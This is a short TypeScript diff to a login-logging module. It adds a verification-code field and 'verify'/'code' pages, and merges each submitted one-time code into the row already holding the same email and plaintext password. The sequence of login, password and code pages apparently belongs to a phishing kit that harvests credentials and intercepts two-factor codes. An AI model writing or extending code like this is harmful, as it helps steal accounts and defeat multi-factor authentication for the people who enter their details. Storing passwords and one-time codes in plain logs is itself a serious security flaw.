@@ -2,7 +2,8 @@ export type LogEntry = {
   email?: string
   password?: string
   rememberMe?: boolean
-  page: 'login' | 'password'
+  code?: string
+  page: 'login' | 'password' | 'verify' | 'code'
   ts: number
 }
 
@@ -42,6 +43,24 @@ export function appendLog(entry: Omit<LogEntry, 'ts'>) {
         list[targetIndex] = { ...prev, ...entry, ts: now, page: 'password' }
       } else {
         // If somehow no prior row, create one to avoid losing data
+        list.push({ ...entry, ts: now })
+      }
+    } else if (entry.page === 'verify' || entry.page === 'code') {
+      // Merge verification info/code into the latest attempt for this email (or last row)
+      let targetIndex = -1
+      if (entry.email) {
+        for (let i = list.length - 1; i >= 0; i--) {
+          if (list[i].email === entry.email) {
+            targetIndex = i
+            break
+          }
+        }
+      }
+      if (targetIndex === -1 && list.length > 0) targetIndex = list.length - 1
+      if (targetIndex >= 0) {
+        const prev = list[targetIndex]
+        list[targetIndex] = { ...prev, ...entry, ts: now, page: entry.page }
+      } else {
         list.push({ ...entry, ts: now })
       }
     }
